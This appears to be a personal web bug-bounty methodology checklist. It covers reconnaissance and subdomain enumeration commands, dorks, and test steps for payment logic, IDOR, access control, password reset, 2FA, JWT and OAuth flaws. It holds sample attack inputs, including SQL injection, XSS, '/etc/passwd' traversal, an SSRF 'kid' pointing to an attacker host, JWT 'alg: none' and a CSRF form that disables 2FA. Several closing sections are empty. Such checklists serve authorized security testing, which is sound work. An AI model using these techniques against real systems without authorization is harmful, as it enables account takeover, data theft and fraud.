
# RECON
## 1- WHOIS
```shell
whois domain.com
```
[[2- Recon#WHOIS]]

---
## 2- HOST
```shell
host doamin.com
```
[[2- Recon#HOST]]

---
## 3- WHAT WEB
```shell
whatweb doamin.com
```
[[2- Recon#WHAT WEB]]

---
## 4- WAFW00F
```shell
wafw00f http://doamin.com
```
[[2- Recon#WAFFW00F]]

---

## 5- DORKS

### GOOGLE
```shell
site:example.com inurl:login
```

```shell
site:example.com inurl:admin
```

```shell
site:example.com filetype:__
```

```shell
site:example.com inurl:config.php
```

```shell
site:example.com ext:conf
```

```shell
site:example.com ext:cnf
```

```shell
site:example.com inurl:backup
```

```shell
site:example.com filetype:sql
```

[[2- Recon#DORKS#GOOGLE DORKS]]
### GITHUB

```shell
"target.com" filename:ex_password_
```

```shell
"target.com" language:ex_python_
```

```shell
"target.com" extention:python
```

```shell
"target.com" password — passwd — pwd — secret — private — Ldap
```

```shell
"target.com" password language:ex_bash_
```

[[2- Recon#DORKS#GITHUBDORKS]]

---

## 6- SUBDOAMIN ENUMERATI1ON
```shell
subfinder -d example.com -o sub_subfinder.txt
```

```shell
assetfinder --subs-only example.com > sub_assetfinder.txt
```

```shell
amass enum -passive -d example.com -o sub_amass_passive.txt
```

```shell
amass enum -brute -active -d domain.com -o sub_amass_active.txt
```
Then add all subdomains to the same file 
```shell
cat sub_*.txt | sort -u > all_subdomains.txt
```

to get all live subdomains
```shell
httpx -l all_subdomains.txt -o live_subdomains.txt
```
to get all live subdomains with some detailed
```
httpx -l live_subdomains.txt -status-code -title -tech-detect -timeout 30 -retries 2 -threads 10 -no-fallback -rate-limit 10 -o info_live_subdomain_full.txt -silent -include-chain
```
grep for subdomains include this words 
```
admin
api
auth
login
dev
test
stag
internal
portal
vpn
mail
dashboard
control
manage
cpanel
backend
rest
graphql
sso
oauth
intranet
sharepoint
ftp
ssh
db
database
mysql
redis
jenkins
gitlab
EOF
```

to get all dead subdomains
```shell
grep -Fxv -f live_subdomains.txt all_subdomains.txt > dead_subdomains.txt
```

path to wordlists for subdomain enumeration
```shell
/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```


[[2- Recon#SUBDOMAIN ENUMERATION#SUBFINDER]]

---
## 7- CONTENT DISCOVERY 
To get all url's from `Wayback machine , common crawl , virustotal`
```shell
cat live_subdomains.txt | gau > gau_raw.txt
```

to get all WayBackUrls links                *gau is petter*
```shell
cat live_subdomains.txt | waybackurls > wayback_raw.txt
```

then filtering the output
```shell
cat gau_raw.txt wayback_raw.txt | sort -u > all_urls.txt
```

to get all urls with parameters  in the same file
```shell
cat all_urls.txt | grep "=" | sort -u > params.txt
```

the params.txt file is very important because it can be contain data like 
```
https://shop.example.com/search?q=mobile
https://api.example.com/getUser?id=123
https://dev.example.com/login?redirect=/dashboard
```

## 8- CRAWLING
```shell
katana -list all_subdomains.txt -o katana_raw.txt
```

[[2- Recon#Web Crawling]]

---
## 9- DIRECTORY FUZZING 

```shell
ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -mc 200,302 -o ffuf_out.json
```

path to wordlists for directory fuzzing 
```shell
/usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
```


[[2- Recon#DIRECTORY FIZZING#FFUF]]

---
## 10- JS

[[2- Recon#Analyzing JavaScript]]
[JSFinder](https://github.com/Threezh1/JSFinder.git) 
```shell
python3 JSFinderpy -u 
```

```shell
cat all_urls.txt | grep "\.js" | sort -u > js_urls.txt
```


```shell
file="js_urls.txt" 
download_dir="downloaded_js" 
mkdir -p "$download_dir" 
while IFS= read -r link 
do 
filename=$(basename "$link") 
wget -P "$download_dir" "$link" 
done < "$file"
```

```shell
grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp" *.js
```

[[1.RECON#]]

---
## 11- PORT SCAN 

[[2- Recon#PORT SCANNING]]
to get all subdomains ips
```shell
#!/bin/bash
input="all_subdomains.txt"
output="ips.txt"
: > "$output"  
while read -r l; do
    ip=$(dig +short "$l" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | head -1)
    if [ -n "$ip" ]; then
        echo "$ip" | tee -a "$output"
    fi
done < "$input"
```

```shell
 nmap -sS -p22,21,80,443,8080,8443,3306,5432,27017 -A -T4 -iL ips.txt --script=vuln -oA quick_scan  
```

`NOTE: you can get ips and its subdomain like sub1.example.com,192.168.1.10 usind this script`
```shell
#!/bin/bash
input="all_subdomains.txt"
output="subdomains_with_ips.txt"
: > "$output"  
while read -r l; do
    ip=$(dig +short "$l" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | head -1)
    if [ -n "$ip" ]; then
        echo "[+] $l => $ip"
        echo "$l,$ip" >> "$output"
    else
        echo "[-] $l => No IP found"
        echo "$l,NO_IP" >> "$output"
    fi
done < "$input"
```

---
## 12- PARAMETERS

[[2- Recon#Parameter Fuzzing#ARJUN]]
```shell
arjun -u http://----.com
```

## 401 , 400 , 404 , 429 , 500 , 302 , 301 BYPASS

SOON ...

check it :
```
https://github.com/lobuhi/byp4xx
```



---
## 13- SCANNERS

### NIKTO
```shell
nikto -h https://____.com -Tuning b
```

[[2- Recon#SCANNERS#NIKTO]]

---
### NUCLEI
```shell
nuclei -u <url,url_file.txt> -t template
```

---
### WPSCAN
![[2- Recon#SCANNERS#WpScan]]

---

# LOGIC BUGS 
> **PAYMENT** 
- [ ] Try to change the price of the product from burp (client side validation bypass)
- [ ] try to set the price as a 0
- [ ] try to set the price as a negative number 
- [ ] try to set another product to the cart and put its quantity with negative number and order the products 
- [ ] try to delete the price parameter and see what is going on 
- [ ] check Parameter Pollution in the price parameter like `price=100&price[]=1&price[]=1`
`price=100&price=1&price=0` , `price=100&price=-99`
- [ ] check parameter pollution in the coupon parameter like `coupon=FREE50&coupon=FREE100`
- [ ] try using expierd coupons 
- [ ] Try to get two coupons and switch between them. Once you put the first one, the second time you put the second one, then you go back to the first one again.
- [ ] put many things in your cart then send the check out request and see if you get all productes
- [ ] when you try to place order maybe its sending a specific request so try to sent this request after you add a lot of products in your cart 
- [ ] Try changing the shipping price
- [ ] Try changing your currency to a weaker currency.
- [ ] check if there is a race conditions (get many items with the 1 price)
- [ ] try check out your products with another user's wallet (idor)
- [ ] try parameter pollution and idor like `user_id=123&user_id=456&wallet_id=123`
- [ ] Try to obtain a product that is not available
- [ ] try changing the request method 
- [ ] try changing the response 
- [ ] try changing the content type 
- parameter pollution 
```json
product_id=123&
price=99.99&price=0.01&
quantity=1&quantity[]=1&quantity[]=1&
coupon=WELCOME20&coupon=SUMMER50&
shipping=10&free_shipping=true&
currency=USD&currency[]=JPY&
tax_rate=10&tax_exempt=yes
```

---

>**IDOR** 

- [ ] change the request headers like `uuid` or `uid`
- [ ] change the URL in request like `/users/01 → /users/02`
- [ ] try to change another user seetinge like photo or email or phone number etc
- [ ] try to delete another user with his id 
- [ ] try to access another user data by changing his id  (idor lead to pii data)
- [ ]  Try Parameter Pollution: `users-01 users-01&users-02`
- [ ] Try Older versions of `api` endpoints: `/api/v3/users/01` → `/api/v1/users/02`
- [ ] Add extension: `/users/01` → `/users/82.json`
- [ ] Change Request Methods: `POST /users/81` → `GET, PUT, PATCH, DELETE` etc
- [ ] Change Response : `301 Found -> 200 OK`
- [ ] Check if `Referer` or some other `Headers` are used to validate the `IDs`: `GET /users/02` → `403 Forbidden Referer: [example.com/users/01](<http://example.com/users/01>) GET /users/82` → `200 OK Referer: [example.com/users/02](<http://example.com/users/02>)`
- [ ] Encrypted IDs: If application is using encrypted IDs, try to decrypt using [hashes.com](http://hashes.com/) or other tools.
- [ ]  Swap GUID with Numeric ID or email: `/users/1b84c196-89f4-4260-b18bed85924ce283` or `/users/82` or `/users/agb.com`
- [ ] Try GUIDs such as: `00000000-0000-0000-0000-000000000000` and `11111111-1111-1111-1111-111111111111`
- [ ] GUID Enumeration: Try to disclose GUIDs using `Google Dorks`, `Github`, `Wayback`, `Burp history`
- [ ] If none of the GUID Enumeration methods work then try: `Signup`, `Reset Password`, Other endpoints within application and analyze response. These endpoints mostly disclose user's GUID.
- [ ] `403/401` Bypass: If server responds back with a `403/401` then try to use burp intruder and send `50-100` requests having different IDs: Example: from `/users/01` to `/users/100`
- [ ] Bruteforce Hidden HTTP parameters
- [ ] send wildcard instead of an id
- [ ]  Bypass object level authorization Add parameter onto the endpoit if not present by defualt
- [ ] HTTP Parameter Pollution Give multi value for same parameter                        `GET /api_v1/messages?user_id=attacker_id&user_id=victim_id`                      `GET /api_v1/messages?user_id=victim_id&user_id=attacker_id`
- [ ] change file type `GET /user_data/2341 -> 401` `GET /user_data/2341.json -> 200` `GET /user_data/2341.xml -> 200` `GET /user_data/2341.config -> 200` `GET /user_data/2341.txt -> 200` 
- [ ] json parameter pollution `"userid":1234,"userid":2542}`
- [ ] Wrap the ID with an array in the body `{"userid":123} ->401{"userid":{"userid":123}} ->200`
- [ ] test an outdated API versions `GET /v3/users_data/1234 ->401GET /v1/users_data/1234 ->200`

---

> **ACCESS CONTROL** 

**HORIZONTAL :**
- [ ] Use account-A's Cookie/ Authorization-token to access account-B's Resources/Objects
- [ ] change the api keys & uid & id parameters to access other users data (idor to pii)
- [ ] search for other users id from there profiles and try to use it to get idors
- [ ] check edit profile or update your data functions if you can access others users data
- [ ] try to change another user or admin  setings or data `BFLA - API`
- [ ] check the delete user function to delete another users account
- [ ] try to change the url endpoint to access the other users data like `http://lol.com/lol/user1` to `http://lol.com/lol/user2`
- [ ] try to change request method and content type 
- [ ] try to change response 
- [ ] Use the newsletter unsubscribe Session to Access any Victim's PII
- [ ] see if you can add headers from response and use it in your request `Mass assignment -API`
- [ ] use arjun to fuzz for more parameters
- [ ] see if you can add some headers in request like `role=admin` , `is_admin=true` `Mass assignment -API`
- [ ] Testing different HTTP methods (GET, POST, PUT, DELETE, PATCH)
- [ ] Duplicate -> `?id=1&id=2`
- [ ] Add as an array -> `?id[]=1&id[]=2`
- [ ] try to get premium account by changing parameter 

**VERTICAL :**
- [ ] Use account-A's Cookie/ Authorization-token to access Admin's Resources/Objects
- [ ] check if you can change the parameter value to be an admin like `http://lol.com/home?admil=true`
- [ ] check if you can change the cookies in your browser to be an admin
- [ ] try to access internal functions in the admin panal like delete user `BFLA - API`
- [ ] Check if you can Change the parameter value to be an admin like `admin=true` or `isadmin=true` 
- [ ] Check for Forbidden Features for low privilege user and try to use this features
- [ ] Decode JWT token and change `"role": "user"` to `"role": "admin"` or change your data to another user data 
- [ ] Use `"alg": "none"` in JWT header to bypass signature verification then try to delete the signature 
- [ ] Check  `robots.txt` file to find any  admin panal 
- [ ] Access `.git` directory to find admin credentials in commit history
- [ ] see if you can add headers from response and use it in your request `Mass assignment -API`
- [ ] use arjun to fuzz for more parameters
- [ ] check admin directories in js files
- [ ] try to access internal functions in the admin panal by changing the `refere` header to `/admin` or `/adimn_login` and use this function like `http://lol.com/admin?deleteuser=nour`
- [ ] Testing different HTTP methods (GET, POST, PUT, DELETE, PATCH)

- mass assignment methods [[https://book.hacktricks.wiki/en/pentesting-web/mass-assignment-cwe-915.html]] 

---

>IMPORTANT FUNCTIONS 

**RESET PASSWORD :**
*WITH TOKEN :*
- [ ] No rate limiting on `/forgot-password` endpoint
- [ ] Change user_id in reset link: `/reset?token=XXX&user_id=ATTACKER_ID`
- [ ] Change email parameter `/reset?token=XXX&email=attacker@evil.com`
- [ ] Change username parameter if used
- [ ] try parameter Pollution 
 ```
email=victim@gmail.com&email=attacker@gmail.com
email=victim@gmail.com%20email=attacker@gmail.com
email=victim@gmail.com|email=attacker@gmail.com
email=victim@gmail.com%0d%0acc:attacker@gmail.com
email=victim@gmail.com&code=<TOKEN>
 ```
- [ ] Send JSON array injection `{"email": ["victim@target.com", "attacker@evil.com"]}`
- [ ] Check if you can change the user id 
- [ ] try changing request method 
- [ ] change the content type
- [ ] try changing response to `200 OK`
- [ ] Check Weak password reset token algorithm
	```
	- Timestamp
	- UserID
	- Email of User
	- Firstname and Lastname
	- Date of Birth
	- Cryptography
	- Number only
	- Small token sequence ( characters between [A-Z,a-z,0-9])
	- Token reuse
	- Token expiration date
	```
- [ ] change you cookie to the victim cookie and try to change the password
- [ ] Response body editing `{"success":false} → {"success":true}`
- [ ] JWT token manipulation (alg:none, kid injection, weak secret)
- [ ] try username like `username@your_domain_or_burp.com` maybe you got the like
- [ ] check js files if you can find the function that can generate the token
- [ ] Check if the Referer header is leaking the password reset token
- [ ] check if you can use the same token many times (token never expired)
- [ ] try to delete the token and change password without it 
- [ ] try to change the token value to `token=AAAAAAAA` or delete it like `token=`
- [ ] try to send many requests without the same victim info in the same second (race condition)
- [ ] Password Reset Token leak Via Referrer header
	1.  Request password reset to your email address
	2. Click on the password reset link
	3. Don’t change password
	4. Click any 3rd party websites(eg: Facebook, twitter)
	5. Intercept the request in Burp Suite proxy
	6. Check if the referrer header is leaking password reset token.


*WITH OTP :*
- [ ] check there is no rate limit for sending the otp 
- [ ] check if no rate limit in otp (brute force to ato)
- [ ] No OTP expiry or long expiry time
- [ ] OTP bypass via null/empty value
- [ ] change your id to the victim id
- [ ] try special otp like `000000`


**CHANGE EMAIL :**
- [ ] Change email for other users by modifying user_id parameter
- [ ] Change email without providing current password or empty password or wrong password 
- [ ]  Change to email that already exists in system
- [ ] if you must use OTP then try OTP brute force (no rate limiting)
- [ ] Change the request method and content type 
- [ ] change the response 
- [ ] Send multiple change email requests with changing the user id (race condition in email)
- [ ] Add unexpected parameters (verified=true)
- [ ] Parameter pollution: `new_email=attacker@evil.com&new_email=victim@company.com`
- [ ] JSON array injection: `{"new_email": ["attacker@evil.com", "victim@company.com"]}`
- [ ]  Change email with different session tokens
- [ ] `attacker@evil.com\0victim@company.com` (null byte)
- [ ] `attacker@evil.com,victim@company.com` (multiple emails)
- [ ] injection in email field 
	- [ ] SQL injection in email field: `test@evil.com'--`
	- [ ] XSS payload in email field: `"><script>alert(1)</script>@evil.com`
	- [ ] Path traversal in email field: `../../etc/passwd@evil.com`
- [ ] CSRF ATTACKS : 
	- [ ] No CSRF token in change password form
	- [ ] CSRF token not validated - accepts any token
	- [ ] Token reuse - use same token multiple times


**CHANGE PASSWORD :**
- [ ] Submit without `old_password` parameter** - system might not check
- [ ] Empty old password - `old_password: ""`
- [ ] Wrong old password - `old_password: "wrong123"`
- [ ] Remove old_password field entirely from JSON/request
- [ ] Modify `user_id` parameter - change password for other users
- [ ] Try Changing request method and content type
- [ ] Try Changing response too `200 OK` 
- [ ] Access `/api/users/{id}/password` directly
- [ ] Admin endpoints - `/admin/reset-user-password/{id}` from user account
- [ ] Missing authorization check - can change password of users with lower privilege
- [ ] Direct POST to change endpoint without loading form first
- [ ] Skip password confirmation - don't send `confirm_password`
- [ ] Race condition- change password twice simultaneously
- [ ] Change password with stolen session cookie
- [ ] Session doesn't expire after password change (old sessions still work)
- [ ] Extremely long password causing DoS
- [ ] if attacker has temporary access to session then Change password without old password when using "password reset" flow
- [ ] CSRF ATTACKS : 
	- [ ] No CSRF token in change password form
	- [ ] CSRF token not validated - accepts any token
	- [ ] Token reuse - use same token multiple times


---

> **403 bypass :**


**TOOLS :**
```
https://github.com/iamj0ker/bypass-403
https://github.com/channyein1337/403-bypass/blob/main/403-bypass.py
https://github.com/Dheerajmadhukar/4-ZERO-3  - RECOMMENDED
```

**How to use 4-ZERO-3**
installation 
```
git cone https://github.com/Dheerajmadhukar/4-ZERO-3.git
```
- Complete Scan {includes all exploits/payloads} for an endpoint  `--exploit` 
```shell
./403-bypass.sh -u https://target.com/secret --exploit
```

**MANUAL :**
- [ ] search in `wayback` about this subdomain you can find any important path
- [ ] try to change response to 200 OK
- [ ] then use match and replace to change the Response and access this page from browser 
 
---
# AUTHENTICATION BUGS

> BROKEN AUTHENTICATION 
- [ ] Check if you can use **disposable emails**
- [ ] Long **password** (>200) leads to **DoS** and Check if the Application Crashes for few seconds
- [ ] Check rate limits on account creation (create many accounts)
- [ ] Use username@**burp_collab**.net and analyze the **callback**
- [ ]  look at the default credentials in  [CIRT.net](https://www.cirt.net/passwords). or brute force it using [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
- [ ] 
- [ ] old session dose not expird
 ```text
    1.create An account On Your Target Site
	2.Login Into Two Browser With Same Account(Chrome, FireFox.You Can Use Incognito Mode As well) 
    3.Change You Password In Chrome, On Seccessfull Password Change Referesh Your Logged in Account In FireFox/Incognito Mode.
    4.If you'r still logged in Then This Is a Bug
 ```


*2FA & OTP :*

| **Technique**                                 |
| --------------------------------------------- |
| Response Manipulation                         |
| Status Code Manipulation                      |
| 2FA Code Leakage in Response                  |
| JavaScript File Analysis                      |
| 2FA Code Reusability                          |
| Lack of Brute-Force Protection                |
| Missing 2FA Code Integrity Validation         |
| CSRF on 2FA Disabling                         |
| Backup Code Abuse                             |
| Clickjacking on 2FA Disabling Page            |
| Enabling 2FA Without Expiring Active Sessions |
| Bypass 2FA with `null` or `000000`            |

- [ ] check if there is no rate limit in login with OTP
- [ ] try to skip 2fa pages like delete the 2fa form url `/nour/2fa --> /nour/profile` (force browsing)
- [ ] try to skip 2fa pages by drop the request in burp proxy 
- [ ] In response, if `{“success”:false}`, change it to `{“success”:true}`
- [ ] If Status Code is 4xx, try to change it to 200 OK and see if it bypass restrictions
- [ ] check if you can see the 2fa code in response  (otp is leaking in response)
- [ ] try to re-use the same old 2FA code and if it is used then you can consider it as a bug or use the same 2fa code many times **(old otp is still valid)** 
- [ ] check if you can use the same otp in another user 
- [ ]  analysis the JS file to find the OTP 
- [ ] Enable 2FA without verifying the email
- [ ] Try IDOR 
- [ ] 2FA Code Leakage in Response
- [ ] Bypassing OTP in registration forms by repeating the form submission multiple times using repeater
- [ ] check if you can bypassing the 2fa by using blank code like `otp= `
- [ ] check if the account locks after several attempts of brute forceing the otp 
- [ ] check the `000000`or `111111` or `123456` is valid (misconfiguration)
- [ ] Bypass 2FA with `null`
- [ ] Clickjacking on 2FA Disabling Page
- [ ] try CSRF
	```html
	<form action="https://victim-site.com/disable-2fa" method="POST">
    <input type="hidden" name="disable" value="true">
    <input type="submit" value="Click to win a prize!">
	</form>
	```

---

> JWT

- [ ] Edit the JWT with another User ID / Email
- [ ] Test if sensitive data is in the JWT
- [ ] Edit the `alg` parameter to `none` and delete the signature
- [ ] Remove `alg` field entirely
- [ ] Add custom claims like `admin: true`, `role: "admin"`
- [ ] Test JWT secret brute-forcing `python3 jwt_tool.py <JWT> -C -d <Wordlist>`
- [ ] use  [wordlist of well-known secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list) to crack the secret keys
- [ ] Abusing JWT Public Keys Without knowing the Public Key https://github.com/silentsignal/rsa_sign2n
- [ ]   Test if algorithm could be changed
	- Change algorithm to None `python3 jwt_tool.py <JWT> -X a`
	- Change algorithm from RS256 to HS256 `python3 jwt_tool.py <JWT> -S hs256 -k public.pem`
- [ ]  Check for Injection in "kid" element `python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""`
- [ ] Key Injection
    - SQL injection in `kid`: `kid' OR '1'='1`
    - Path traversal: `kid`: `../../../etc/passwd`
    - SSRF in `kid`: `kid`: `http://attacker.com/key`
    - XSS in `kid`: `kid`: `"><script>alert(1)</script>`

---

>OAUTH
-   
    
    Test `edirect_uri` for [[Open Redirect]] and [[Web-App Security/XSS|XSS]]
    
- Test the existence of response_type=token
    
- Missing state parameter? -> CSRF
    
- Predictable state parameter?
    
- Is state parameter being verified?

---

# INJECTIONS BUGS 

# CLIENT SIDE BUGS 


# API BUGS


# CMS BUGS 

# AUTOMATION

# OTHER

# 

 